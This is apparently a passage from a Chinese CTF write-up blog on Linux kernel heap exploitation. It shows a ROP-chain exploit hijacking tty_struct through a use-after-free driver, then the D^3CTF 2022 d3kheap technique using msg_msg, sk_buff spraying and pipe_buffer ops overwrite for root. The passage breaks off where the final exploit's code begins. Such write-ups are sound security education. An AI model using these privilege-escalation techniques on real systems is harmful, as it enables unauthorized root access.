<br><br>  <span class="hljs-type">size_t</span> buff[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">size_t</span> fake_tty_operations[<span class="hljs-number">0x30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  PRINT_ADDR(<span class="hljs-string">&quot;fake_tty_operations&quot;</span>, fake_tty_operations);<br>  <span class="hljs-type">size_t</span> tty_struct_padding[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <br>  <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;<br>  rop[p++] = pop_rdi;<br>  rop[p++] = <span class="hljs-number">0x6f0</span>;<br>  rop[p++] = mov_rc4_rdi_pop_rbp;<br>  rop[p++] =((<span class="hljs-type">size_t</span>)&amp;rop&amp;(~<span class="hljs-number">0xfff</span>));<br>  rop[p++] = getRootPrivilige;<br>  rop[p++] = swapgs_pop_rbp;<br>  rop[p++] = ((<span class="hljs-type">size_t</span>)&amp;rop&amp;(~<span class="hljs-number">0xfff</span>));<br>  rop[p++] = iretq;<br>  rop[p++] = get_shell;<br>  rop[p++] = user_cs;<br>  rop[p++] = user_rflags;<br>  rop[p++] = user_sp;<br>  rop[p++] = user_cs;<br><br><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)&#123;<br>    fake_tty_operations[i] = mov_rsp_rax_ret;<br>  &#125;<br>  fake_tty_operations[<span class="hljs-number">0</span>] = pop_rax_ret;<br>  fake_tty_operations[<span class="hljs-number">1</span>] = rop;<br>  <span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>  ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);<br>  close(fd1);<br>  <span class="hljs-comment">//alloc the UAF chunk to tty_struct</span><br>  <span class="hljs-type">int</span> fd3 = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);<br>  <br>  <span class="hljs-comment">//overwrite the tty_struct-&gt;ops</span><br>  read(fd2, tty_struct_padding, <span class="hljs-number">0x30</span>);<br>  tty_struct_padding[<span class="hljs-number">3</span>] = fake_tty_operations;<br>  write(fd2, tty_struct_padding, <span class="hljs-number">0x30</span>);<br>  write(fd3, buff, <span class="hljs-number">0x10</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="例题：D-3CTF-kheap"><a href="#例题：D-3CTF-kheap" class="headerlink" title="例题：D^3CTF - kheap"></a>例题：D^3CTF - kheap</h2><h3 id="1-题目逆向-1"><a href="#1-题目逆向-1" class="headerlink" title="1. 题目逆向"></a>1. 题目逆向</h3><p>首先查看其中运行脚本</p><p>开启smep、smap、kaslr、pti,双核双线程、monitor置为null</p><p>然后我们再查看出题者贴心的提供给我们的内核配置信息</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># D3CTF2022 - d3kheap</span><br><br>baby heap in kernel space, just sign me in plz :)<br><br>Here are some kernel config options you may need<br><br><span class="hljs-code">```</span><br><span class="hljs-code">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="hljs-code">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br><span class="hljs-code">CONFIG_SLUB=y</span><br><span class="hljs-code">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="hljs-code">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="hljs-code">CONFIG_HARDENED_USERCOPY=y</span><br><span class="hljs-code">```</span><br><br></code></pre></td></tr></table></figure><p>我们发现其中开启了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_SLAB_FREELIST_RANDOM</span>=y<br><span class="hljs-attr">CONFIG_SLAB_FREELIST_HARDENED</span>=y<br></code></pre></td></tr></table></figure><p>其中一个时freelist指针对特定值的异或还有其中分布的随机化</p><p>这一手配置，风雨不透啊</p><p>然后我们通过文件系统的init脚本可以得知插入了一个d3kheap.ko驱动模块，此时我们基本可以判定漏洞出自于他，接下来咱们继续分析</p><p>题目给出的漏洞十分简洁，a3师傅本意是为了使得大家更加专注于漏洞利用，而不是纯粹的逆向代码分析，这点倒是同用户态相反</p><p>我们可以通过ioctl来申请一个1k的块，然后我们有着两次kfree的机会，且存在UAF，那么就是这样一个十分明显的漏洞，我们的重心得以转到如何去利用它这点</p><h3 id="2-socketpair基础知识"><a href="#2-socketpair基础知识" class="headerlink" title="2.socketpair基础知识"></a>2.socketpair基础知识</h3><p>该系统调用通常被用来进行Linux网络编程，个人感觉有点类似于进程间通信的pipe，同样都是进行通信，但是socketpair支持全双工通信</p><p>他的使用也同pipe类似，通过传入一个大小为2的数组来分别作为读写fd指针，其调用如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">SYSCALL_DEFINE4(socketpair, <span class="hljs-type">int</span>, <span class="hljs-keyword">family</span>, <span class="hljs-type">int</span>, <span class="hljs-keyword">type</span>, <span class="hljs-type">int</span>, protocol,<br><span class="hljs-type">int</span> __user *, usockvec)<br>&#123;<br><span class="hljs-keyword">return</span> __sys_socketpair(<span class="hljs-keyword">family</span>, <span class="hljs-keyword">type</span>, protocol, usockvec);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里仅仅给出系统调用的声明部分</p><h3 id="3-sk-buff基础知识"><a href="#3-sk-buff基础知识" class="headerlink" title="3.sk_buff基础知识"></a>3.sk_buff基础知识</h3><p>他被多次应用于网络消息传递的过程中，其中在我们读写上面的socketpair的时候同样会用到，我们来查看一下他的结构体内容，也由于太长我就不放太多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* These two members must be first. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span>*<span class="hljs-title">next</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span>*<span class="hljs-title">prev</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span>*<span class="hljs-title">dev</span>;</span><br><span class="hljs-comment">/* Some protocols might use this space to store information,</span><br><span class="hljs-comment"> * while device pointer would be NULL.</span><br><span class="hljs-comment"> * UDP receive path is one user.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>dev_scratch;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_node</span><span class="hljs-title">rbnode</span>;</span> <span class="hljs-comment">/* used in netem, ip4 defrag, and tcp stack */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">list</span>;</span><br>&#125;;<br><br><br><span class="hljs-comment">/* These elements must be at the end, see alloc_skb() for details.  */</span><br><span class="hljs-type">sk_buff_data_t</span>tail;<br><span class="hljs-type">sk_buff_data_t</span>end;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*head,<br>*data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>truesize;<br><span class="hljs-type">refcount_t</span>users;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SKB_EXTENSIONS</span><br><span class="hljs-comment">/* only useable after checking -&gt;active_extensions != 0 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">skb_ext</span>*<span class="hljs-title">extensions</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>next:用作同其他sk_buff进行链接，就如同msg_msg一样类似</li><li>prev:同上</li><li>tail:指向数据区中实际数据结束的地方</li><li>end:指向数据区中结束的地方（这里是非实际的，具体在下面讲解）</li><li>head:指向数据区中开始的地方（非实际）</li><li>data:指向数据区中实际数据开始的地方</li></ul><p>当我们利用上面的系统调用进行write的时候，也就是发送包的过程，就会调用其中的一个函数 <code>alloc_skb</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_skb - allocate a network buffer</span><br><span class="hljs-comment"> * @size: size to allocate</span><br><span class="hljs-comment"> * @priority: allocation mask</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function is a convenient wrapper around __alloc_skb().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> sk_buff *<span class="hljs-title function_">alloc_skb</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> priority)</span><br>&#123;<br><span class="hljs-keyword">return</span> __alloc_skb(size, priority, <span class="hljs-number">0</span>, NUMA_NO_NODE);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里主要是调用 <code>__alloc_skb</code>，我们继续查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Allocate a new skbuff. We do this ourselves so we can fill in a few</span><br><span class="hljs-comment"> *&#x27;private&#x27; fields and also do memory statistics to find all the</span><br><span class="hljs-comment"> *[BEEP] leaks.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *__alloc_skb-allocate a network buffer</span><br><span class="hljs-comment"> *@size: size to allocate</span><br><span class="hljs-comment"> *@gfp_mask: allocation mask</span><br><span class="hljs-comment"> *@flags: If SKB_ALLOC_FCLONE is set, allocate from fclone cache</span><br><span class="hljs-comment"> *instead of head cache and allocate a cloned (child) skb.</span><br><span class="hljs-comment"> *If SKB_ALLOC_RX is set, __GFP_MEMALLOC will be used for</span><br><span class="hljs-comment"> *allocations in case the data is required for writeback</span><br><span class="hljs-comment"> *@node: numa node to allocate memory on</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Allocate a new &amp;sk_buff. The returned buffer has no headroom and a</span><br><span class="hljs-comment"> *tail room of at least size bytes. The object has a reference count</span><br><span class="hljs-comment"> *of one. The return is the buffer. On a failure the return is %NULL.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Buffers may only be allocated from interrupts using a @gfp_mask of</span><br><span class="hljs-comment"> *%GFP_ATOMIC.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> *__<span class="hljs-title">alloc_skb</span>(<span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">size</span>, <span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>,</span><br><span class="hljs-class">    <span class="hljs-title">int</span> <span class="hljs-title">flags</span>, <span class="hljs-title">int</span> <span class="hljs-title">node</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff</span> *<span class="hljs-title">skb</span>;</span><br>u8 *data;<br><span class="hljs-type">bool</span> pfmemalloc;<br><br>cache = (flags &amp; SKB_ALLOC_FCLONE)<br>? skbuff_fclone_cache : skbuff_head_cache;<br><br>...<br>        <br><span class="hljs-keyword">else</span><br>skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~GFP_DMA, node);<br><span class="hljs-keyword">if</span> (unlikely(!skb))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>prefetchw(skb);<br><br><span class="hljs-comment">/* We do our best to align skb_shared_info on a separate cache</span><br><span class="hljs-comment"> * line. It usually works because kmalloc(X &gt; SMP_CACHE_BYTES) gives</span><br><span class="hljs-comment"> * aligned memory blocks, unless SLUB/SLAB debug is enabled.</span><br><span class="hljs-comment"> * Both skb-&gt;head and skb_shared_info are cache line aligned.</span><br><span class="hljs-comment"> */</span><br>size = SKB_DATA_ALIGN(size);<br>size += SKB_DATA_ALIGN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> skb_shared_info));<br>data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>我们重点关注以上代码，我们知道当我们分配这个 <code>struct sk_buff</code>结构体的时候，他会从自带的cache当中分配，但是当我们分配数据部分的时候，他会调用 <code>kmalloc_reserve</code>进行分配，该函数则会从通用的kmem_cache当中申请，这里他的大小会首先进行对齐然后加上一个 <code>struct skb_shared_info</code>大小的结构体，然后再进行分配，该结构体大小为320字节</p><p>所以我们的一个大致 <code>sk_buff + data</code>的分配情况如下：</p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png"></p><p>而当我们释放的时候只需要调用read读取相应通道包即可。</p><h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><p>我们首先可以利用题目中的ioctl来分配一个1k大小的空间，然后直接释放他了再接着分配一个大小为 1k的 <code>msg_msg</code>结构体，他就作为本次题目当中的 <code>victim</code>,但是经过测试在释放过后紧接着分配0x400的msg_msg并不能立刻获取刚刚free掉的kheap块，这一点我在最开始思考的时候也很不解，然后发现有师傅已经提前问了这个问题，据出题者a3师傅所言</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3801213fb80e7becb76060d2692eb9389b506b4f.jpg"></p><p>而我考虑到本题环境是双核双线程，所以我又在启动脚本改为单核单线程后尝试仍然不能立刻分配，这里还存在一定疑问:(</p><p>所以由于我们现在并不能知道 哪个<code>msg_queue</code>中的 <code>msg_msg</code>分配到了刚刚free掉的堆块，所以我们需要堆喷 <code>msg_queue</code>，然后再设法找到其中的 <code>victim_msg_queue</code></p><p>这里我们利用到 <code>CVE-2021-22555</code>的思路，构造一个主从 <code>msg_msg</code>，如下：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png"></p><p>我们在每个 <code>msg_queue</code>链条上面分配出一个主msg_msg(96)和一个从msg_msg(0x400,同体中所给kheap在同一kmem_cache当中取),这里构造成这样是为了之后能通过他读取 <code>victim msg_msg&#39;s addr</code></p><p>然后我们再一次用掉题目中所给出的free机会，我们利用刚刚讲到的 <code>sk_buff</code>，堆喷 <code>sk_buff</code>来试图分配到之前释放掉的kheap，但是此时上面仍存在着msg_msg，因此我们可以填入虚假信息，然后读取每一个 <code>msg_msg</code>，如果读取失败则说明找到了对应的 <code>victim msg_msg</code></p><p>当我们找到了对应堆块后，我们可以修改他的 <code>m_ts</code>来造成越界读，我们此时可以读取该 <code>msg_msg</code>相邻的 <code>msg_msg</code>,这里相邻是因为之前我们进行了大量的堆喷，所以这里基本上是存在着相邻情况，当然不排除小概率情形。</p><p>首先我们需要知道每个 <code>msg_queue</code>中，msg_msg之间以及头都是靠着双链表进行链接的，也就是 <code>struct msg_msg-&gt;list_head-&gt;*</code>相连</p><p>所以我们可以越界读相邻从 <code>msg_msg</code>的prev指针，该指针指向的是该相邻主 <code>msg_msg</code>的所在的地方，因此我们之后再将 <code>victim msg_msg-&gt;next</code>指针修改成他，这样我们就可以成功泄露出相邻从 <code>msg_msg</code>的首地址，然后我们将其首地址减去0x400就得到了我们的 <code>victim msg_msg</code>的地址</p><p>知道了我们 <code>victim msg_msg</code>的虚拟地址之后，我们考虑再使用一个结构体，那就是较为流行的 <code>pipe_buffer</code>，该结构体默认首先分配一个大小为0x400的 <code>pipe_buffers</code>数组，而 <code>struct pipe_buffer</code>上又存在着内核基地址，因此我们可以泄露他并且修改 <code>pipe_buffer-&gt;ops</code>函数表，因为我们目前掌握着一个内核堆地址并且可以通过不断释放和堆喷 <code>sk_buff</code>来修改他，所以我们可以很容易的伪造这个函数表，当我们关闭管道两端，他就会调用 <code>pipe_buffer-&gt;ops-&gt;release</code>函数，我们就可以按照正常ROP来完成提权</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8b13632762d0f70301b4f7ef4efa513d2697c5fb.jpg"></p><p>最终exp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><code class="hljs c">define _GNU_SOURCE <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_QUEUE_NR 